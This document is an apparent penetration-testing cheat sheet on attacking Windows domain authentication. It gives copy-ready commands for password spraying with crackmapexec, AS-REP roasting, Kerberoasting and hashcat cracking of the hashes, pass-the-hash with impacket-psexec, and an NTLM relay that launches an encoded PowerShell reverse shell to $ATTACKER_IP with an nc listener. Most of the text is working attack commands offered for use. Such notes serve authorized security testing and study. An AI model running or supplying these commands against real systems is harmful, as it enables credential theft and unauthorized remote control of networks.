# Attacking Authentication

## Password spray


Password spray attack with crackmapexec.
Note that crackmapexec doesn't look at the policy for locking users

```
crackmapexec smb $RHOST -u ${USERS_FILE} -p '${PASSWORD}' -d ${DOMAIN} --continue-on-success
```
Available protocols are: `ssh,mssql,winrm,smb,ldap,rdp,ftp`.

## Impacket

### AS-REP roasting

```
impacket-GetNPUsers -dc-ip ${DC_IP} -request -outputfile asrep-result.txt ${DOMAIN}/${OWNED_USER}
```

### Kerberoasting

This is good for high-privilege service accounts.
check for SPN accounts:
```
impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 

```
Now, we can request the TGS for the found SPN:

```
impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 
```
Note the `$SPN_ACCOUNT` is the account Name, not the ServicePrincipalName.


Now, you can crack the password in the tgs file:

```
hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

### Pass Admin hash psexec

Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:

```
impacket-psexec -hashes 00000000000000000000000000000000:${NTLM_HASH} Administrator@$RHOST
```
Format is `${LM_HASH}:${NT_HASH}` - when using the NTLM hash, just put `32 * 0` in the `LM_HASH` section.

a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM.


### Relay hash with impacket-ntlmrelayx

You can relay SMB requests between SRV1 and SRV2 by doing the following:

* Setup an nc listener on kali: `nc -nvlp 6666`.
* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
* From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.

